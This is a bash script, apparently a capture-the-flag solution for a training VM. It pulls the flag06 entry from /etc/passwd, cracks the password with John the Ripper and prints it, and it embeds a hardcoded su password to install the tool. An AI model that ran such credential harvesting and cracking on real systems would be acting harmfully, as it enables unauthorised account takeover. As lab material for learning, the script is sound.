#!/bin/bash
##
# this script uses `john` to break an old legacy
# unix password.
#
# it isn't installed by default so we use the root
# user to install it prior to us cracking it
#
# we could download it and do it on our own machines
# but i want it all done in a nice script
##

# do we have `john` installed?
which john > /dev/null
if [ $? -eq 1 ]; then
  # if not run as root to install it
  # password is 'nebula'
  su nebula -c "sudo apt-get install john"
fi

# we only want to check flag06's entry
grep flag06 /etc/passwd > passwd
# run the command and place the result in RECORD
RECORD=$(john --show passwd | grep flag06)
rm passwd # we no longer need that file

IFS=":"   # this defines out delimeter
set ${RECORD} # break up entry
unset IFS # return to default value

# print out the password
echo "password of flag06 is: ${2}"
